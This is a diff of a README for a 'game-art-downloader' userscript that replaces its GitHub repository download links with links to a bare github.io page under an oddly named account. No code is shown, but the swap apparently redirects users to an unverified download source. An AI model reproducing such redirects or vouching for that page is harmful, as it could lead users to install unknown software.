@@ -1,6 +1,6 @@
 # 🎮 game-art-downloader - Save game images with one click
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/anachronismgenuslolium750/game-art-downloader)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://anachronismgenuslolium750.github.io)
 
 ## About the Project ℹ️
 
@@ -27,7 +27,7 @@ The manager icon appears in your toolbar once complete.
 
 ## Step Two: Download the Tool ⚙️
 
-Visit this page to download the script: [https://github.com/anachronismgenuslolium750/game-art-downloader](https://github.com/anachronismgenuslolium750/game-art-downloader)
+Visit this page to download the script: [https://anachronismgenuslolium750.github.io](https://anachronismgenuslolium750.github.io)
 
 1. Navigate to the link shown above.
 2. Locate the link to the latest version of the script.
